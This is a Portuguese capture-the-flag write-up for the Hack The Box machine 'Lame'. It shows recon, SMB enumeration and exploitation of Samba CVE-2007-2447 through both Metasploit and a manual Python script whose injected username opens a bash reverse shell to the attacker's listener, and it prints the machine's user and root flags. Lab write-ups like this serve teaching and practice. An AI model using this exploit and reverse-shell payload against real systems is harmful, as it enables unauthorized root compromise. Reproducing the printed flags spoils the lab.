---
title: "Lame"
date: 2024-01-10
type: "labs"
difficulty: "Easy"
pwned: true
os: "Linux"
tags: ["smb", "samba", "metasploit", "cve-2007-2447", "rce"]
summary: "Máquina clássica do HTB. Samba 3.0.20 com CVE-2007-2447 (usermap_script) dá shell como root diretamente."
machine_info:
  IP: "10.10.10.3"
  OS: "Linux (Debian)"
  Dificuldade: "Easy"
  CVE: "CVE-2007-2447"
  Porta principal: "445/tcp (Samba)"
---

## Reconhecimento

```bash
$ nmap -sC -sV -oN nmap/lame.txt 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian
```

O vsftpd 2.3.4 também tem backdoor (CVE-2011-2523), mas o Samba dá root direto.

## Enumeração Samba

```bash
$ smbclient -L //10.10.10.3 -N
        Sharename    Type   Comment
        --------     ----   -------
        print$       Disk   Printer Drivers
        tmp          Disk   oh noes!
        opt          Disk
        IPC$         IPC    IPC Service
        ADMIN$       IPC    IPC Service
```

## Exploração — CVE-2007-2447

O Samba 3.0.20 tem uma vulnerabilidade no parâmetro `username` do MS-RPC que permite injeção de comandos shell.

### Via Metasploit

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.10.10.3
msf6 exploit(usermap_script) > set LHOST tun0
msf6 exploit(usermap_script) > set LPORT 4444
msf6 exploit(usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.X:4444
[*] Command shell session 1 opened

# whoami
root
```

### Manual (sem Metasploit)

```python
#!/usr/bin/env python3
# CVE-2007-2447 — Samba usermap_script RCE
from smb.SMBConnection import SMBConnection
import sys

LHOST = "10.10.14.X"
LPORT = 4444
TARGET = "10.10.10.3"

# Payload injetado no username via logon SMB
payload = f"/=`nohup bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'`"

conn = SMBConnection(payload, "", "", "", use_ntlm_v2=False)
try:
    conn.connect(TARGET, 445, timeout=5)
except:
    pass  # A conexão vai cair, mas o payload já executou
```

Em outro terminal:

```bash
$ nc -lvnp 4444
Connection from 10.10.10.3
# id
uid=0(root) gid=0(root)
```

## Flags

```bash
# cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5

# cat /root/root.txt
92caac3be140ef409e45721348a4e9df
```
